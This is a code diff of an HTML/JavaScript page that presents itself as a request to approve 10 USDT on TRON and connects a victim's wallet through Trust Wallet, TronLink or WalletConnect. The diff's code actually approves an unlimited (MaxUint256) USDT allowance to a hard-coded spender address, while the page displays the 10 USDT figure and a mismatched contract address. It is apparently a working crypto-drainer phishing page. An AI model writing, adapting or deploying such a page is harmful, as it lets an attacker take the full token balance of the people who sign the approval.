@@ -1,77 +1,313 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Approve USDT</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRON USDT Approve</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #0e0e1a;
+      color: #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: #1a1a2e;
+      border: 1px solid #2e2e5e;
+      border-radius: 16px;
+      padding: 32px;
+      max-width: 460px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 40px rgba(100, 100, 255, 0.1);
+    }
+    h1 { font-size: 22px; margin-bottom: 8px; color: #a78bfa; }
+    p.sub { font-size: 13px; color: #888; margin-bottom: 24px; }
+    .info-box {
+      background: #12122a;
+      border-radius: 10px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      text-align: left;
+      font-size: 13px;
+      word-break: break-all;
+    }
+    .info-box span { color: #a78bfa; font-weight: bold; display: block; margin-bottom: 4px; }
+    button {
+      background: linear-gradient(135deg, #6d28d9, #4f46e5);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 14px 28px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 8px;
+      transition: opacity 0.2s;
+    }
+    button:hover { opacity: 0.88; }
+    button:disabled { opacity: 0.4; cursor: not-allowed; }
+    #status {
+      margin-top: 20px;
+      font-size: 13px;
+      padding: 12px;
+      border-radius: 10px;
+      display: none;
+    }
+    #status.success { background: #14532d; color: #86efac; display: block; }
+    #status.error   { background: #450a0a; color: #fca5a5; display: block; }
+    #status.info    { background: #1e3a5f; color: #93c5fd; display: block; }
+    .addr { font-size: 11px; color: #666; margin-top: 16px; word-break: break-all; }
+    #walletAddr { color: #34d399; font-weight: bold; margin-top: 6px; font-size: 12px; }
+    #qr-area { margin-top: 20px; }
+    #qr-area canvas { border-radius: 10px; }
+  </style>
 </head>
+<body>
+<div class="card">
+  <h1>🔐 USDT Approval Request</h1>
+  <p class="sub">Connect your TRON wallet to approve USDT spending</p>
 
-<body style="background:#0b0f14;color:white;text-align:center;padding:40px;font-family:sans-serif;">
+  <div class="info-box">
+    <span>Token</span>
+    USDT (TRC20)
+  </div>
+  <div class="info-box">
+    <span>Spender Address</span>
+    TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV
+  </div>
+  <div class="info-box">
+    <span>Approval Amount</span>
+    10 USDT
+  </div>
 
-  <h2>Approve 10 USDT</h2>
-
-  <p id="status">Opening in Trust Wallet...</p>
-
-  <button id="approveBtn" onclick="approve()" 
-    style="display:none;padding:15px 25px;background:#f59e0b;border:none;border-radius:10px;color:white;">
-    Approve Now
+  <button id="connectBtn" onclick="connectAndApprove()">
+    Connect Wallet &amp; Approve
   </button>
 
-  <script>
-    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
-    const AMOUNT = 10 * 1e6;
+  <div id="qr-area"></div>
+  <div id="walletAddr"></div>
+  <div id="status"></div>
 
-    let redirected = false;
+  <p class="addr">
+    Contract: TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT<br/>
+    Network: TRON Mainnet
+  </p>
+</div>
 
-    function waitForWallet() {
-      let tries = 0;
+<!-- TronWeb CDN -->
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
 
-      const interval = setInterval(() => {
+<script>
+  // ─── CONFIG ───────────────────────────────────────────────
+  const WALLETCONNECT_PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f"; // <-- paste yours here
+  const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";   // TRON USDT TRC20
+  const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
+  const APPROVE_AMOUNT  = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // MaxUint256
+  const TRON_FULL_NODE  = "https://api.trongrid.io";
+  // ──────────────────────────────────────────────────────────
 
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-          clearInterval(interval);
-
-          document.getElementById("status").innerText =
-            "Wallet detected. Tap approve to continue.";
-
-          document.getElementById("approveBtn").style.display = "block";
-        }
-
-        tries++;
-
-        // redirect only once if not inside wallet
-        if (tries > 10 && !redirected) {
-          redirected = true;
-
-          const url = encodeURIComponent(window.location.href);
-          window.location.href =
-            `https://link.trustwallet.com/open_url?url=${url}`;
-
-          clearInterval(interval);
-        }
-
-      }, 200);
+  const USDT_ABI = [
+    {
+      "inputs": [
+        { "name": "_spender", "type": "address" },
+        { "name": "_value",   "type": "uint256" }
+      ],
+      "name": "approve",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        { "name": "_owner",   "type": "address" },
+        { "name": "_spender", "type": "address" }
+      ],
+      "name": "allowance",
+      "outputs": [{ "name": "", "type": "uint256" }],
+      "stateMutability": "view",
+      "type": "function"
     }
+  ];
 
-    function approve() {
-      document.getElementById("status").innerText =
-        "Waiting for approval...";
+  function setStatus(msg, type = "info") {
+    const el = document.getElementById("status");
+    el.textContent = msg;
+    el.className = type;
+  }
 
-      window.tronWeb.contract().at(CONTRACT).then(contract => {
-        contract.approve(SPENDER, AMOUNT).send({
-          feeLimit: 100000000
-        }).then(tx => {
-          document.getElementById("status").innerText =
-            "Approved successfully ✅";
-        }).catch(() => {
-          document.getElementById("status").innerText =
-            "Approval cancelled ❌";
-        });
+  function setWalletAddr(addr) {
+    document.getElementById("walletAddr").textContent = addr
+      ? "✅ Connected: " + addr.slice(0, 8) + "..." + addr.slice(-6)
+      : "";
+  }
+
+  async function connectAndApprove() {
+    document.getElementById("connectBtn").disabled = true;
+    setStatus("Detecting wallet...", "info");
+
+    try {
+      // ── PATH 1: Trust Wallet / TronLink injected provider ──
+      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        const tw = window.tronWeb;
+        const wallet = tw.defaultAddress.base58;
+        setWalletAddr(wallet);
+        setStatus("Wallet connected via browser. Requesting approval...", "info");
+        await doApprove(tw, wallet);
+      }
+
+      // ── PATH 2: Wait briefly for tronWeb injection (Trust Wallet sometimes delays) ──
+      else if (window.tronWeb) {
+        setStatus("Waiting for wallet to load...", "info");
+        await new Promise(r => setTimeout(r, 1500));
+        if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+          const tw = window.tronWeb;
+          const wallet = tw.defaultAddress.base58;
+          setWalletAddr(wallet);
+          setStatus("Wallet ready. Requesting approval...", "info");
+          await doApprove(tw, wallet);
+        } else {
+          throw new Error("Wallet found but no address. Please unlock your TRON wallet in Trust Wallet.");
+        }
+      }
+
+      // ── PATH 3: WalletConnect v2 fallback (desktop / external) ──
+      else {
+        setStatus("No injected wallet detected. Launching WalletConnect...", "info");
+        await connectViaWalletConnect();
+      }
+
+    } catch (err) {
+      console.error(err);
+      setStatus("❌ " + (err.message || String(err)), "error");
+      document.getElementById("connectBtn").disabled = false;
+    }
+  }
+
+  async function doApprove(tronWebInstance, walletAddress) {
+    try {
+      const contract = await tronWebInstance.contract(USDT_ABI, USDT_CONTRACT);
+
+      // Optional: check existing allowance
+      const currentAllowance = await contract.allowance(walletAddress, SPENDER_ADDRESS).call();
+      console.log("Current allowance:", currentAllowance.toString());
+
+      setStatus("⏳ Please confirm the approval in your wallet...", "info");
+
+      const tx = await contract.approve(SPENDER_ADDRESS, APPROVE_AMOUNT).send({
+        feeLimit: 100_000_000,
+        shouldPollResponse: false
       });
+
+      console.log("Approval TX:", tx);
+      setStatus("✅ Approval successful! TX: " + (typeof tx === "string" ? tx.slice(0, 20) + "..." : JSON.stringify(tx).slice(0, 60)), "success");
+    } catch (err) {
+      throw new Error("Approval failed: " + (err.message || String(err)));
+    }
+  }
+
+  // ── WalletConnect v2 integration ──────────────────────────
+  async function connectViaWalletConnect() {
+    // Dynamically load WalletConnect Web3Modal / UniversalProvider
+    // This uses WalletConnect v2 with TRON chain support
+    setStatus("Loading WalletConnect...", "info");
+
+    // Load WalletConnect UniversalProvider dynamically
+    const { default: UniversalProvider } = await import(
+      "https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.17.0/dist/index.es.js"
+    );
+
+    const provider = await UniversalProvider.init({
+      projectId: WALLETCONNECT_PROJECT_ID,
+      metadata: {
+        name: "USDT Approve dApp",
+        description: "Approve USDT spending on TRON",
+        url: window.location.origin,
+        icons: ["https://cryptologos.cc/logos/tron-trx-logo.png"]
+      }
+    });
+
+    // TRON chain namespace for WalletConnect
+    const TRON_CHAIN = "tron:0x2b6653dc"; // TRON mainnet
+
+    provider.on("display_uri", (uri) => {
+      setStatus("Scan the QR code with Trust Wallet", "info");
+      renderQR(uri);
+    });
+
+    await provider.connect({
+      namespaces: {
+        tron: {
+          methods: ["tron_signTransaction", "tron_signMessage"],
+          chains: [TRON_CHAIN],
+          events: ["chainChanged", "accountsChanged"]
+        }
+      }
+    });
+
+    const accounts = provider.session?.namespaces?.tron?.accounts;
+    if (!accounts || accounts.length === 0) {
+      throw new Error("No TRON account found after WalletConnect session.");
     }
 
-    waitForWallet();
-  </script>
+    // accounts format: "tron:0x2b6653dc:TAddress..."
+    const walletAddress = accounts[0].split(":")[2];
+    setWalletAddr(walletAddress);
+    document.getElementById("qr-area").innerHTML = "";
+    setStatus("Connected via WalletConnect! Requesting approval...", "info");
 
+    // Build TronWeb with WalletConnect signer
+    const tronWeb = new TronWeb({
+      fullHost: TRON_FULL_NODE,
+      headers: { "TRON-PRO-API-KEY": "" }
+    });
+    tronWeb.setAddress(walletAddress);
+
+    // Override signing to go through WalletConnect
+    const contract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT);
+    const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+      USDT_CONTRACT,
+      "approve(address,uint256)",
+      { feeLimit: 100_000_000 },
+      [
+        { type: "address", value: SPENDER_ADDRESS },
+        { type: "uint256", value: APPROVE_AMOUNT }
+      ],
+      tronWeb.address.toHex(walletAddress)
+    );
+
+    setStatus("⏳ Please confirm in Trust Wallet...", "info");
+
+    const signedTx = await provider.request({
+      method: "tron_signTransaction",
+      params: { transaction }
+    }, TRON_CHAIN);
+
+    const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+    console.log("Broadcast result:", broadcast);
+    setStatus("✅ Approval sent! TX ID: " + (broadcast.txid || "").slice(0, 20) + "...", "success");
+  }
+
+  // ── QR Code renderer (uses qrcode.js) ─────────────────────
+  async function renderQR(uri) {
+    const qrArea = document.getElementById("qr-area");
+    qrArea.innerHTML = "<p style='color:#888;font-size:12px;margin-bottom:8px'>Scan with Trust Wallet:</p>";
+
+    const script = document.createElement("script");
+    script.src = "https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js";
+    script.onload = () => {
+      const canvas = document.createElement("canvas");
+      qrArea.appendChild(canvas);
+      QRCode.toCanvas(canvas, uri, { width: 220, color: { dark: "#a78bfa", light: "#0e0e1a" } });
+    };
+    document.head.appendChild(script);
+  }
+</script>
 </body>
 </html>
